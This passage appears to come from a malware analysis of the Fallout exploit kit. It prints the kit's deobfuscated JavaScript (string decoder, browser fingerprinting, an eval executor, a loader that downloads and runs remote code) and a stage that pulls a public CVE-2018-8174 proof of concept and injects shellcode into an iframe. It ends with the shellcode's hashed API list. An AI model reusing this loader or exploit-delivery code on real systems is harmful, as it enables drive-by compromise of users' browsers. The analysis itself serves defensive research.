<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">DwQ5oeN9ct</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">hxk4VZ3L8GC</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="nx">DwQ5oeN9ct</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">UsEJ64xf0P</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">D8H6A7MGHf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">r5UpGh</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">D8H6A7MGHf</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">D8H6A7MGHf</span><span class="o">++</span><span class="p">,</span> <span class="nx">r5UpGh</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">r5UpGh</span> <span class="o">===</span> <span class="nx">hxk4VZ3L8GC</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
            <span class="nx">r5UpGh</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nx">UsEJ64xf0P</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">D8H6A7MGHf</span><span class="p">)</span> <span class="o">^</span> <span class="nx">hxk4VZ3L8GC</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">r5UpGh</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">UsEJ64xf0P</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The next object, make sure that it is not in Chrome and Opera using, for example, User-Agent.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">i2668FMs5B8</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">BITU978SF7</span> <span class="o">=</span> <span class="p">((</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opr</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opr</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">addons</span><span class="dl">'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opera</span><span class="dl">'</span><span class="p">]</span> <span class="o">||</span> <span class="nb">navigator</span><span class="p">[</span><span class="dl">'</span><span class="s1">userAgent</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1"> OPR/</span><span class="dl">'</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">InstallTrigger</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="kc">false</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">documentMode</span><span class="dl">'</span><span class="p">])</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">runtime</span><span class="dl">'</span><span class="p">]);</span>
    <span class="k">return</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">cMa5g</span><span class="dl">'</span><span class="p">](</span><span class="nx">BITU978SF7</span><span class="p">[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The next object is for executing code. This is the most important object.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">eCWmvY</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">eval</span><span class="dl">'</span><span class="p">](</span><span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">toString</span><span class="dl">'</span><span class="p">]());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>With these codes, the following code will be executed. This downloads the encoded data and executes it.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">onreadystatechange</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">4</span> <span class="o">==</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">readyState</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="mi">200</span> <span class="o">==</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">status</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">W7iaUaId</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">];</span>
        <span class="kd">var</span> <span class="nx">riqAvm0Is</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">jbRyz</span><span class="dl">'</span><span class="p">](</span><span class="nx">W7iaUaId</span><span class="p">)[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">riqAvm0Is</span><span class="p">[</span><span class="dl">'</span><span class="s1">eCWmvY</span><span class="dl">'</span><span class="p">]();</span>
    <span class="p">}</span>
<span class="p">};</span>

<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">post</span><span class="dl">'</span><span class="p">,</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">jbRyz</span><span class="dl">'</span><span class="p">](</span><span class="nx">mbwk99</span><span class="p">)[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span> <span class="p">[</span><span class="dl">'</span><span class="s1">i2668FMs5B8</span><span class="dl">'</span><span class="p">]());</span>
</code></pre></div></div>

<h2 id="encoded-data">Encoded data</h2>
<p>When decoding the code, it looks like the following.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">ZV7S8RUn</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">-- Shellcode here --</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">dIl15w</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">XDomainRequest</span><span class="dl">'</span><span class="p">]();</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">onload</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">H2Kqgnp</span> <span class="o">=</span> <span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">WW7QZmX</span> <span class="o">=</span> <span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">&lt;script language="vbscript"&gt;</span><span class="dl">'</span><span class="p">),</span><span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">&lt;/body&gt;</span><span class="dl">'</span><span class="p">));</span>
    <span class="kd">var</span> <span class="nx">l1a2N5kr</span> <span class="o">=</span> <span class="nx">WW7QZmX</span><span class="p">[</span><span class="dl">'</span><span class="s1">split</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">L8c4YdRG</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">L8c4YdRG</span> <span class="o">&lt;</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">L8c4YdRG</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="kd">var</span> <span class="nx">zEZGDPaGVEt</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">g68j2okJh5D</span><span class="p">),</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">g68j2okJh5D</span><span class="p">)));</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="nx">zEZGDPaGVEt</span><span class="p">,</span><span class="nx">ZV7S8RUn</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\'</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">TJIp1rglYoq</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\'</span><span class="dl">'</span><span class="p">));</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="nx">TJIp1rglYoq</span><span class="p">,</span><span class="dl">''</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">MsgBox</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">Alert</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">WW7QZmX</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="dl">'</span><span class="s1">join</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">nbvMHPdb</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">nbvMHPdb</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">AARa7</span><span class="dl">"</span><span class="p">);</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">nbvMHPdb</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">ocH5HC2B</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">AARa7</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">WW7QZmX</span><span class="p">);</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">get</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">https://raw.githubusercontent.com/w7374520/CVE-2018-8174_EXP/master/CVE-2018-8174.py</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>This code is exploit by replacing the shellcode part of PoC of CVE-2018-8174 on GitHub. We are finding that four PoCs are being exploited. There may be other things.</p>

<ul>
  <li>w7374520/CVE-2018-8174_EXP/master/CVE-2018-8174.py</li>
  <li>admintony/VulRec/master/CVE-2018-8174/calc.html</li>
  <li>kaisaryousuf/CVE-2018-8174-msf/master/CVE-2018-8174.rb</li>
  <li>lovebair2022/CVE-2018-8174-msf/master/CVE-2018-8174.rb</li>
</ul>

<h2 id="shellcode">Shellcode</h2>
<p><a href="https://www.nao-sec.org/2019/01/in-depth-analysis-of-new-fallout.html">In the previous blog</a> We wrote that Fallout uses RC4 and powershell. Currently, It decrypts with RC4 using multiple keys.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-6UVMjUup6qo/XHn461S2DQI/AAAAAAAAaAc/ihjgvwM48ds78W-1a50a5naMAiw-jtvwQCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B121824.jpg" /></p>

<p><img alt="" src="https://1.bp.blogspot.com/-DymvnKJrNeE/XHn5O-hzKBI/AAAAAAAAaAs/s8JysGgcRwAk_vvDNVcUIIu8nLHY0LfswCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B123150.jpg" /></p>

<h3 id="encrypted-data">Encrypted data</h3>
<p>Encrypted data is near the end of the shell code.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-gsfXIhMYevM/XHn8WBk9ovI/AAAAAAAAaBg/10bGFzmcPOwREpu9jFcdDV_QNU_q428QQCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B124509.jpg" /></p>

<p>The following strings are encrypted.</p>

<ul>
  <li>URL</li>
</ul>

<p><img alt="" src="https://3.bp.blogspot.com/-mGb6y9CcLgY/XHn_tTXITlI/AAAAAAAAaBs/Tx-IZGvfR7MKXeLZoduOknHsG-oG611mACLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B094830.jpg" /></p>

<ul>
  <li>Path</li>
</ul>

<p><img alt="" src="https://1.bp.blogspot.com/-nJQJtvhQ4ts/XHoAJThO_UI/AAAAAAAAaB0/AqdnhErozq4RtSn0IBPxDh26i1VIb3ySwCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B094918.jpg" /></p>

<ul>
  <li>lpszAgent</li>
</ul>

<p><img alt="" src="https://4.bp.blogspot.com/-SHiC_-K52OE/XHoAYO0KSqI/AAAAAAAAaB4/mIuho6VGEigMXjQD0PYCic7yPSQjP50agCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095113.jpg" /></p>

<ul>
  <li>HTTP Method</li>
</ul>

<p><img alt="" src="https://1.bp.blogspot.com/-8VHYdHuFVzo/XHoAun-ulAI/AAAAAAAAaCE/dZL11EMf0Js8hKDBVtWrb1TpxiUKVleHgCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095212.jpg" /></p>

<ul>
  <li>Dll name</li>
</ul>

<p><img alt="" src="https://4.bp.blogspot.com/-d1VACU5EdCg/XHoA0UXjwJI/AAAAAAAAaCI/4nYEy6pr69YYZGCk-PYTL4DwLlXGXPEaACLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095457.jpg" /></p>

<h3 id="execute">Execute</h3>
<p><img alt="" src="https://1.bp.blogspot.com/-J6-pH9sR77Y/XHoD9uuQ2rI/AAAAAAAAaCg/tdiUL-ppen0UgdBMlAw0YJoIAOp5JoJkgCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B131719.jpg" /></p>

<h3 id="api-hash">API hash</h3>
<p>The API called by the shell code has been hashed by the dualaccModFFF1Hash algorithm.</p>

<p><img alt="" src="https://3.bp.blogspot.com/--PgKXNTSaEU/XHoC9ETsXsI/AAAAAAAAaCY/YfQrDoaJySA6qJpeQcsquCv6MRV5XyxwgCLcBGAs/s320/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B131317.jpg" /></p>



<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ShellcodeHashSearcher: 0x00000686: dualaccModFFF1Hash:0x191c0443 kernel32.dll!CloseHandle
ShellcodeHashSearcher: 0x00000694: dualaccModFFF1Hash:0x28b90575 kernel32.dll!CreateProcessA
ShellcodeHashSearcher: 0x000006a6: dualaccModFFF1Hash:0x73320951 kernel32.dll!CreateToolhelp32Snapshot
ShellcodeHashSearcher: 0x000006b9: dualaccModFFF1Hash:0x33f50614 kernel32.dll!GetModuleHandleA
ShellcodeHashSearcher: 0x000006ca: dualaccModFFF1Hash:0x1d810497 kernel32.dll!LoadLibraryA
ShellcodeHashSearcher: 0x000006da: dualaccModFFF1Hash:0x2785054d kernel32.dll!Process32First
ShellcodeHashSearcher: 0x000006eb: dualaccModFFF1Hash:0x225904e4 kernel32.dll!Process32Next
ShellcodeHashSearcher: 0x000006fc: dualaccModFFF1Hash:0x1f7004d3 kernel32.dll!VirtualAlloc
ShellcodeHashSearcher: 0x0000070d: dualaccModFFF1Hash:0x1a1e047a kernel32.dll!ExitProcess
ShellcodeHashSearcher: 0x0000071e: dualaccModFFF1Hash:0x158503f3 kernel32.dll!ExitThread
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c msvcrt.dll!memset
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c ntoskrnl.exe!memset
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c ntdll.dll!memset
ShellcodeHashSearcher: 0x00000778: dualaccModFFF1Hash:0x3610065d wininet.dll!HttpOpenRequestA
ShellcodeHashSearcher: 0x00000787: dualaccModFFF1Hash:0x29fb0584 wininet.dll!HttpQueryInfoA
ShellcodeHashSearcher: 0x0000079a: dualaccModFFF1Hash:0x35c70655 wininet.dll!HttpSendRequestA
ShellcodeHashSearcher: 0x000007ab: dualaccModFFF1Hash:0x4b92078c wininet.dll!InternetCloseHandle
ShellcodeHashSearcher: 0x000007bc: dualaccModFFF1Hash:0x36640655 wininet.dll!InternetConnectA
